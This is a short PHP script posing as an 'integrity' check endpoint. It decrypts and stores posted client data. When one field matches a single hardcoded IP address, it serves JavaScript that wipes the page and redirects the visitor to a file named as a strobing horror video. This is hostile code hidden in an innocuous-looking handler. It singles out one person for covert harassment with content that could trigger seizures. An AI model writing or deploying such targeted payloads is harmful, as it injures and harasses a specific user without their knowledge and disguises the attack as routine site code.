<?php
include_once "inc/bootstrap.php";

if (isset($_POST['integrity-v2'])) {
	$decryptedData = decrypt_integrity($_POST['integrity-v2']);
	if (is_array($decryptedData)) {
		insert_integrity($decryptedData);

		if (
			$decryptedData['ti'] == "92.41.158.32"
		) {
			error_log("ACK!");
			http_response_code(234);
			header("Content-Type: text/javascript; charset=utf-8");
			echo "document.body.remove(); location = \"/strobingjeffthekiller.mp4\";";
		}
	}
}

